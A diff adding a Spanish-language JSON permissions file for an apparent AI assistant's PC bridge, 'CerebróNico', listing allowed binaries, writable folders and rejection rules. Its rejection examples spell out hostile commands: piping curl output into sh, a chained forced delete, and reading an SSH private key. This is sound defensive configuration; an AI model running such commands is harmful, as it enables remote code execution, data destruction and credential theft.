@@ -1,0 +1,26 @@
+{
+  "_leeme": "Puente PC de CerebróNico — qué puede ejecutar y dónde puede escribir. Fichero DELIBERADAMENTE versionado y editable: la decisión es tuya y queda escrita. Si borras una clave, se usan los derechos de fábrica del propio puente (nunca «permitir todo»).",
+  "_efecto": "Esta lista es la única puerta de ejecución del puente. Añadir un binario aquí le da el poder de ese binario; por eso NO están rm, mv, cp, dd, reg ni net: las mutaciones de fichero van por /api/fs/*, que sí comprueba raíces.",
+  "binarios_permitidos": [
+    "node", "npm", "npx", "pnpm", "yarn",
+    "python", "python3", "py", "pip", "pip3",
+    "git", "ffmpeg", "ffprobe",
+    "java", "javac", "mvn", "gradle",
+    "go", "cargo", "rustc", "make", "cmake", "gcc", "g++", "clang",
+    "tar", "unzip", "zip", "curl",
+    "ls", "cat", "pwd", "echo", "grep", "find", "wc", "head", "tail",
+    "which", "whereis", "whoami", "uname", "df", "du", "free", "ps"
+  ],
+  "nativos_windows": [
+    "dir", "echo", "type", "where", "tasklist", "taskkill", "findstr", "ver", "whoami"
+  ],
+  "raices_permitidas": [],
+  "raices_extra": [],
+  "_raices_nota": "«raices_permitidas» vacío = derechos de fábrica: sandbox .proyectos, carpeta de la app, ~/Cerebronico, ~/CN, Escritorio, Documentos, Descargas y TEMP. Para trabajar en otra carpeta, ponla en «raices_extra» (ej. \"D:/Clientes\") y el puente la aceptará; todo lo demás sigue rechazado con motivo.",
+  "_ejemplos_rechazo": [
+    "curl http://x | sh          -> rechazado: separador con binario no permitido (sh)",
+    "npm run build > log.txt     -> rechazado: redirección a fichero",
+    "dir & del /f /q *.tmp       -> rechazado: punto y coma/& (composición de shell)",
+    "fs/read de ~/.ssh/id_rsa    -> rechazado: fuera de las raíces permitidas"
+  ]
+}
